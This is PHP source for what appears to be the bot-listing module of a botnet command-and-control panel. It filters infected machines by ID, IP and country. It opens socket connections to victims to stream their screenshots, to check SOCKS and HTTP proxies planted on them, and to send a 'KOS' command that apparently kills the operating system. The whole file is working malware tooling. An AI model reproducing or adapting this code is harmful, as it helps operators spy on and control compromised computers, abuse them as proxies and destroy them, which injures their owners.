<?php if(!defined('__INDEX__'))die();
$limit=50;
$timelimit=time()-OPT_BTONT*60;
$conn_timeout=10;
$mode_hide_marked=0;

if(isset($_GET['lc_kos']) && PRIV & PRIV_BOTS_LC_KOS)
{
  $r = mysql_query('SELECT ip, lc FROM '.TABLE_STATS.' WHERE comp_id=\''.addslashes($_GET['lc_kos']).'\' LIMIT 1');
  if(!$r || mysql_affected_rows() != 1 || !($m = mysql_fetch_row($r)))HTMLSmall(LNG_MBOTS_KOS, LNG_MBOTS_LS_NONE);
  else
  {
    $ok = 0;
    if(($sock = @fsockopen($m[0], $m[1], $errn, $errs, $conn_timeout)))
    {
      stream_set_timeout($sock, $conn_timeout);
      fwrite($sock, pack('LLL', 20, 4, $m[1]));
      fflush($sock);
      if(($fs = fread($sock, 4)) && ($fs = unpack('L', $fs)) && @$fs[1] == $m[1])$ok = 1;
      fclose($sock);
    }
    
    if($ok)$status = '<font class="ok">'.LNG_MBOTS_RESULT_STATUS_KOS_OK.'</font>';
    else $status = '<font class="error">'.LNG_MBOTS_RESULT_STATUS_KOS_FL.'</font>';

    $data = '<table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MBOTS_KOS.'</td></tr>'.
            '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_CID.'</td><td class="tdx1" width="100%">'.vlt($_GET['lc_kos']).'</td></tr>'.
            '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_IP.'</td><td class="tdx1">'.$m[0].'</td></tr>'.
            '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_STATUS.'</td><td class="tdx2">'.$status.'</td></tr>'.
            '</table>';
     HTMLSmall(LNG_MBOTS_KOS, $data);
  }
  die();
}
else if(isset($_GET['lc_ss']) && MODULES & MODULE_BOTS_LC_SS && PRIV & PRIV_BOTS_LC_SS)
{
  if(isset($_GET['port'])&&$_GET['port']>0)
  {
    $format='image/'.OPT_LCSSF;
    $quality=OPT_LCSSQ;
    if(!($sock=@fsockopen($_GET['lc_ss'],$_GET['port'],$errn,$errs,$conn_timeout)))die($errs);
    stream_set_timeout($sock,$conn_timeout);
    fwrite($sock,pack('LLL',10,strlen($format)+4,$quality).$format);
    fflush($sock);
    if(($fs=fread($sock,8))&&($fs=unpack('L2',$fs)))
    {
      $data=0;
      while($data<$fs[1]&&!feof($sock))
      {
        $need=min($fs[2],$fs[1]-$data);
        if(!($td=fread($sock,$need)))break;
        $sm=strlen($td);
        while($sm<$need&&!feof($sock)&&($td2=fread($sock,$need-$sm))){$sm+=strlen($td2);$td.=$td2;}
        if($data==0)header('Content-Type: '.$format);
        $data+=$sm;
        print $td;
        if(!fwrite($sock,pack('L',$fs[2])))break;
        fflush($sock);
      }
      if($data>0){fclose($sock);die();}
    }
    fclose($sock);
    die(); 
  }
  else
  {
    $r=mysql_query('SELECT ip,lc,inst,up,country,time,bn,ftime FROM '.TABLE_STATS.' WHERE comp_id=\''.addslashes($_GET['lc_ss']).'\' LIMIT 1');
    if(!$r||mysql_affected_rows()!=1||!($m=mysql_fetch_row($r)))HTMLSmall(LNG_MBOTS_SS,LNG_MBOTS_LS_NONE);
    else
    {
      $data='<table class="tbl1" width="100%" height="100%"><tr><td class="td1" colspan="2">'.LNG_MBOTS_SS.'</td></tr>'.
            '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_CID.'</td><td class="tdx1" width="100%">'.vlt($_GET['lc_ss']).'</td></tr>'.
            '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_VERBID.'</td><td class="tdx2">'.int2ver(max($m[2],$m[3])).'/'.$m[6].'</td></tr>'.
            '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_IP.'</td><td class="tdx1">'.$m[0].'</td></tr>'.
            '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_CNT.'</td><td class="tdx2">'.htmlentities($m[4]).'</td></tr>'.
            '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_TIME.'</td><td class="tdx1">'.gmdate(LNG_FORMAT_DT,$m[5]).'</td></tr>'.
            '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_FTIME.'</td><td class="tdx2">'.gmdate(LNG_FORMAT_DT,$m[7]).'</td></tr>'.
            '<tr height="100%"><td class="tdx1" colspan="2" valign="top" align="center"><img class="ssi" src="'.QUERY_STRING.'&lc_ss='.urlencode($m[0]).'&port='.$m[1].'"></td></tr>'.
            '</table>';
      HTMLSmall(LNG_MBOTS_SS,$data);
    }
  }
  die();
}
else if(isset($_GET['socks'])&&MODULES&MODULE_BOTS_SOCKS&&PRIV&PRIV_BOTS_SOCKS)
{
  $r=mysql_query('SELECT ip,socks,inst,up,country,time,bn,ot,speed FROM '.TABLE_STATS.' WHERE comp_id=\''.addslashes($_GET['socks']).'\' LIMIT 1');
  if(!$r||mysql_affected_rows()!=1||!($m=mysql_fetch_row($r)))HTMLSmall(LNG_MBOTS_SOCKS,LNG_MBOTS_SOCKS_NONE);
  else
  {
    if(isset($_GET['used']))mysql_query('INSERT INTO '.TABLE_BIPSP.' SET i=\''.$m[0].'\'');
    if(isset($_GET['nused']))mysql_query('DELETE FROM '.TABLE_BIPSP.' WHERE i=\''.$m[0].'\'');
    $ok=0;
    if(($sock=@fsockopen($m[0],$m[1],$errn,$errs,$conn_timeout)))
    {
      stream_set_timeout($sock, $conn_timeout);
      $data = pack('CCSL',4,1,0,0)."\0";
      if(fwrite($sock, $data) && ($data = fread($sock, 8)) && strlen($data) == 8)$ok=1;
      fclose($sock);
    }
    
    if(IsBlackIP($m[0]))$bip=LNG_MBOTS_RESULT_STATUS_2.'&nbsp<b>[<a href="'.QUERY_STRING.'&socks='.$_GET['socks'].'&nused">'.LNG_MBOTS_RESULT_STATUS_4.'</a>]</b>';
    else $bip=LNG_MBOTS_RESULT_STATUS_1.'&nbsp<b>[<a href="'.QUERY_STRING.'&socks='.$_GET['socks'].'&used">'.LNG_MBOTS_RESULT_STATUS_3.'</a>]</b>';
    
    if($ok)$status='<font class="ok">('.LNG_MBOTS_SOCKS_OK.')</font>';
    else $status='<font class="error">('.LNG_MBOTS_SOCKS_FAILED.')</font>';
    $data='<table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MBOTS_SOCKS.'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_SOCKS_SP.'</td></td><td class="tdx1" width="100%">'.$m[0].':'.$m[1].'&nbsp'.$status.'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_CID.'</td></td><td class="tdx2">'.vlt($_GET['socks']).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_VERBID.'</td><td class="tdx1">'.int2ver(max($m[2],$m[3])).'&nbsp;/&nbsp;'.$m[6].'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_CNT.'</td><td class="tdx2">'.htmlentities($m[4]).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_TIME.'</td><td class="tdx1">'.ftime(LNG_FORMAT_DT,$m[5]).'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_LAG.'</td><td class="tdx2">'.($m[8]/1000).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_ONLINE.'</td><td class="tdx1">'.($m[7]?TxtOT(time()-$m[7]):0).'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_STATUS.'</td><td class="tdx2">'.$bip.'</td></tr>'.
          '</table>';
    HTMLSmall(LNG_MBOTS_SOCKS,$data);
  }
  die();
}
else if(isset($_GET['proxy'])&&MODULES&MODULE_BOTS_PROXY&&PRIV&PRIV_BOTS_PROXY)
{
  $r=mysql_query('SELECT ip,proxy,inst,up,country,time,bn,ot,speed FROM '.TABLE_STATS.' WHERE comp_id=\''.addslashes($_GET['proxy']).'\' LIMIT 1');
  if(!$r||mysql_affected_rows()!=1||!($m=mysql_fetch_row($r)))HTMLSmall(LNG_MBOTS_SOCKS,LNG_MBOTS_SOCKS_NONE);
  else
  {
    if(isset($_GET['used']))mysql_query('INSERT INTO '.TABLE_BIPSP.' SET i=\''.$m[0].'\'');
    if(isset($_GET['nused']))mysql_query('DELETE FROM '.TABLE_BIPSP.' WHERE i=\''.$m[0].'\'');
    $ok=0;
    if(($sock=@fsockopen($m[0],$m[1],$errn,$errs,$conn_timeout)))
    {
      stream_set_timeout($sock, $conn_timeout);
      $data = "GET http://google.com/ HTTP/1.1\r\nHost: google.com\r\n\r\n";
      if(fwrite($sock, $data) && ($data = fread($sock, 8)) && strlen($data) == 8)$ok=1;
      fclose($sock);
    }

    if(IsBlackIP($m[0]))$bip=LNG_MBOTS_RESULT_STATUS_2.'&nbsp<b>[<a href="'.QUERY_STRING.'&proxy='.$_GET['proxy'].'&nused">'.LNG_MBOTS_RESULT_STATUS_4.'</a>]</b>';
    else $bip=LNG_MBOTS_RESULT_STATUS_1.'&nbsp<b>[<a href="'.QUERY_STRING.'&proxy='.$_GET['proxy'].'&used">'.LNG_MBOTS_RESULT_STATUS_3.'</a>]</b>';
    
    if($ok)$status='<font class="ok">('.LNG_MBOTS_PROXY_OK.')</font>';
    else $status='<font class="error">('.LNG_MBOTS_PROXY_FAILED.')</font>';
    $data='<table class="tbl1" width="100%"><tr><td class="td1" colspan="2">'.LNG_MBOTS_PROXY.'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_PROXY_SP.'</td></td><td class="tdx1" width="100%">'.$m[0].':'.$m[1].'&nbsp'.$status.'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_CID.'</td></td><td class="tdx2">'.vlt($_GET['proxy']).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_VERBID.'</td><td class="tdx1">'.int2ver(max($m[2],$m[3])).'&nbsp;/&nbsp;'.$m[6].'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_CNT.'</td><td class="tdx2">'.htmlentities($m[4]).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_TIME.'</td><td class="tdx1">'.ftime(LNG_FORMAT_DT,$m[5]).'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_LAG.'</td><td class="tdx2">'.($m[8]/1000).'</td></tr>'.
          '<tr><td class="tdx1">'.LNG_MBOTS_RESULT_ONLINE.'</td><td class="tdx1">'.($m[7]?TxtOT(time()-$m[7]):0).'</td></tr>'.
          '<tr><td class="tdx2">'.LNG_MBOTS_RESULT_STATUS.'</td><td class="tdx2">'.$bip.'</td></tr>'.
          '</table>';
    HTMLSmall(LNG_MBOTS_PROXY,$data);
  }
  die();
}

HTMLBegin(LNG_MBOTS,'function CheckSocks(cid){window.open(\''.QUERY_STRING.'&socks=\'+cid,cid,\'location=no,menubar=no,resizable=no,scrollbars=no,status=no,toolbar=no,height=200,width=400\');};function CheckProxy(cid){window.open(\''.QUERY_STRING.'&proxy=\'+cid,cid,\'location=no,menubar=no,resizable=no,scrollbars=no,status=no,toolbar=no,height=200,width=400\');}');

$socks_a=MODULES&MODULE_BOTS_SOCKS&&PRIV&PRIV_BOTS_SOCKS;
$proxy_a=MODULES&MODULE_BOTS_PROXY&&PRIV&PRIV_BOTS_PROXY;
$ls_ss_a=MODULES&MODULE_BOTS_LC_SS&&PRIV&PRIV_BOTS_LC_SS;
$ls_kos_a = PRIV & PRIV_BOTS_LC_KOS;
$service=($socks_a || $proxy_a || $ls_ss_a || $ls_kos_a);

$cnts=isset($_GET['cnts'])?trim($_GET['cnts']):'';
$cids=isset($_GET['cids'])?trim($_GET['cids']):'';
$bns=isset($_GET['bns'])?trim($_GET['bns']):'';
$ips=isset($_GET['ips'])?trim($_GET['ips']):'';
$type=(isset($_GET['t'])&&is_numeric($_GET['t'])&&$_GET['t']>=0&&$_GET['t']<=2)?$_GET['t']:0;
$query_string_cnt=QUERY_STRING.'&cids='.urlencode($cids).'&bns='.urlencode($bns).'&ips='.urlencode($ips);
$query_string2=QUERY_STRING.'&cnts='.urlencode($cnts).'&cids='.urlencode($cids).'&bns='.urlencode($bns).'&ips='.urlencode($ips);

print '<form method="GET" action="'.$_SERVER['PHP_SELF'].'"><input type="hidden" name="m" value="'.$module.'"><table class="tbl1"><tr><td class="td1">'.LNG_MBOTS_FILTER.'</td></tr>'.
      '<tr><td><table class="tbl1"><tr><td align="right">'.LNG_MBOTS_FILTER_CNTS.'</td><td><input type="text" name="cnts" size="20" value="'.htmlentities($cnts).'"></td>'.
      '<td align="right">'.LNG_MBOTS_FILTER_CIDS.'</td><td><input type="text" name="cids" size="20" value="'.htmlentities($cids).'"></td></tr>'.
      '<tr><td align="right">'.LNG_MBOTS_FILTER_BNS.'</td><td><input type="text" name="bns" size="20" value="'.htmlentities($bns).'"></td>'.
      '<td align="right">'.LNG_MBOTS_FILTER_IPS.'</td><td><input type="text" name="ips" size="20" value="'.htmlentities($ips).'"></td></tr></table></td></tr><tr><td align="right">';
if($service)
{
  $query_string_cnt.='&t='.$type;
  $query_string2.='&t='.$type;
  print LNG_MBOTS_FILTER_TYPE.'&nbsp;<select name="t">'.
        '<option value="0"'.($type==0?' selected':'').'>'.LNG_MBOTS_FILTER_TYPE1.'</option>'.
        '<option value="1"'.($type==1?' selected':'').'>'.LNG_MBOTS_FILTER_TYPE2.'</option>'.
        '<option value="2"'.($type==2?' selected':'').'>'.LNG_MBOTS_FILTER_TYPE3.'</option>'.
        '</select>&nbsp;';
}
print '<input class="ism" type="submit" value="'.LNG_MBOTS_FILTER_APPLY.'"></td></tr></table></form>';

$options='time>=\''.$timelimit.'\''.Str2Option('comp_id',addslashes(mask2sql(trim($cids))),0).Str2Option('bn',addslashes(trim($bns)),1).Str2Option('country',addslashes(trim($cnts)),1).Str2Option('ip',addslashes(mask2sql(trim($ips))),0);

if($service)
{
  $xp=0;
  if($type==0)
  {
    if($socks_a)$options.=AddOR($xp,'socks>');
    if($proxy_a)$options.=AddOR($xp,'proxy>');
    if($ls_ss_a || $ls_kos_a)$options.=AddOR($xp,'lc>');
  }
  else if($type==1)
  {
    $xp=0;
    if($socks_a)$options.=AddAND($xp,'socks=');
    if($proxy_a)$options.=AddAND($xp,'proxy=');
    if($ls_ss_a || $ls_kos_a)$options.=AddAND($xp,'lc=');
  }
  if($xp!=0)$options.=')';
  if($mode_hide_marked>0)$options.=' AND NOT EXISTS (SELECT i FROM '.TABLE_BIPSP.' WHERE '.TABLE_BIPSP.'.i='.TABLE_STATS.'.ip)';
}

$page=(isset($_GET['p'])&&is_numeric($_GET['p'])?$_GET['p']:0);
$offset=$page*$limit;
$r=mysql_query('SELECT * FROM '.TABLE_STATS.' WHERE '.$options.' ORDER BY time DESC LIMIT '.$offset.', '.($limit + 1));
$total=$r?mysql_affected_rows():0;

$navigator='';
if($offset>0||$total>$limit)
{
  if($offset>0)$navigator.='&nbsp;<a href="'.$query_string2.'&p='.($page - 1).'">'.LNG_MBOTS_RESULT_PREV.'</a>&nbsp;';
  if($total>$limit)
  {
    if($offset>0)$navigator.='<b>|</b>';
    $navigator.='&nbsp;<a href="'.$query_string2.'&p='.($page + 1).'">'.LNG_MBOTS_RESULT_NEXT.'</a>&nbsp;';
  }
  HTMLBox($navigator);
}

$cols=5;
if($socks_a)$cols++;
if($proxy_a)$cols++;
if($ls_ss_a)$cols++;
if($ls_kos_a)$cols++;
if($service)$cols+=2;

print '<table class="tbl1"><tr><td class="td1" colspan="'.$cols.'">'.LNG_MBOTS_RESULT.'</td></tr><tr><td class="td1" align="right">#</td><td class="td1">'.LNG_MBOTS_RESULT_CID.'</td><td class="td1">'.LNG_MBOTS_RESULT_VERBID.'</td><td class="td1">'.LNG_MBOTS_RESULT_IP.'</td><td class="td1">'.LNG_MBOTS_RESULT_CNT.'</td>';
if($socks_a)print '<td class="td1">'.LNG_MBOTS_RESULT_SOCKS.'</td>';
if($proxy_a)print '<td class="td1">'.LNG_MBOTS_RESULT_PROXY.'</td>';
if($ls_ss_a)print '<td class="td1">'.LNG_MBOTS_RESULT_LS_SS.'</td>';
if($ls_kos_a)print '<td class="td1">'.LNG_MBOTS_RESULT_LS_KOS.'</td>';
if($service)print '<td class="td1">'.LNG_MBOTS_RESULT_ONLINE.'</td><td class="td1">'.LNG_MBOTS_RESULT_LAG.'</td>';
print '</tr>';
      
if($total == 0)print '<tr><td align="center" class="tdx1" colspan="'.$cols.'"><i>'.LNG_MBOTS_RESULT_NONE.'</i></td></tr></table>';
else
{ 
  $i=0;
  while($i<$limit&&$m=mysql_fetch_assoc($r))
  {
    $a=($i%2==0?1:2);
    print '<tr'.($mode_hide_marked==0&&IsBlackIP($m['ip'])?' class="ipu"':'').'><td class="tdx'.$a.'" align="right">'.($offset+$i+1).'</td><td class="tdx'.$a.'">'.vlt($m['comp_id']).'</td>'.
          '<td class="tdx'.$a.'" align="right">'.int2ver(max($m['inst'],$m['up'])).'/'.$m['bn'].'</td><td class="tdx'.$a.'">'.$m['ip'].'</td>'.
          '<td class="tdx'.$a.'"><a href="'.$query_string_cnt.'&cnts='.urlencode($m['country']).($service?'&t='.$type:'').'">'.htmlentities($m['country']).'</a></td>';
    if($socks_a)
    {
      print '<td class="tdx'.$a.'" valign="top">';
      if($m['socks']>0)print '<a href="'.QUERY_STRING.'&socks='.urlencode($m['comp_id']).'" onClick="CheckSocks(\''.urlencode($m['comp_id']).'\');return false;">'.$m['ip'].':'.$m['socks'].'</a></td>';
      else print '-</td>';
    }
    if($proxy_a)
    {
      print '<td class="tdx'.$a.'" valign="top">';
      if($m['proxy']>0)print '<a href="'.QUERY_STRING.'&proxy='.urlencode($m['comp_id']).'" onClick="CheckProxy(\''.urlencode($m['comp_id']).'\');return false;">'.$m['ip'].':'.$m['proxy'].'</a></td>';
      else print '-</td>';
    }
    if($ls_ss_a)
    {
      print '<td class="tdx'.$a.'" valign="top">';
      if($m['lc']>0)print '<a target="_blank" href="'.QUERY_STRING.'&lc_ss='.urlencode($m['comp_id']).'">'.LNG_MBOTS_LS_SS_VIEW.'</a></td>';
      else print '-</td>';
    }
    if($ls_kos_a)
    {
      print '<td class="tdx'.$a.'" valign="top">';
      if($m['lc']>0)print '<a target="_blank" href="'.QUERY_STRING.'&lc_kos='.urlencode($m['comp_id']).'">'.LNG_MBOTS_LS_KOS_VIEW.'</a></td>';
      else print '-</td>';
    }
    if($service)
    {
      print '<td class="tdx'.$a.'" align="right">'.($m['ot']?TxtOT(time()-$m['ot']):0).'</td><td class="tdx'.$a.'">'.($m['speed']/1000).'</td>';
    }
    print '</tr>';
    $i++;
  }
  print '</table>';
  if($navigator!='')HTMLBox($navigator);
}
HTMLEnd();

function Str2Option($name,$data,$b){if($data=='')return '';$b=$b?'=':' LIKE ';if(strstr($data,',')===FALSE)return ' AND '.$name.$b.'\''.$data.'\'';$cc=count(($data=explode(',',$data)));$str=' AND (';for($i=0;$i<$cc;$i++){if($i>0)$str.=' OR ';$str.= $name.$b.'\''.trim($data[$i]).'\'';}return $str.')';}
function AddOR(&$x,$name){return (($x++)>0?' OR '.$name.'0':' AND ('.$name.'0');}
function AddAND(&$x,$name){return (($x++)>0?' AND '.$name.'0':' AND ('.$name.'0');}
function TxtOT($tc){return sprintf('%02u:%02u:%02u',$tc/3600,$tc/60-(sprintf('%u',($tc/3600))*60),$tc-(sprintf('%u',($tc/60))*60));}
function IsBlackIP($ip)
{
  $r=mysql_query('SELECT i FROM '.TABLE_BIPSP.' WHERE i=\''.addslashes($ip).'\' LIMIT 1');
  return ($r&&mysql_affected_rows()==1) ? true : false;
}
?>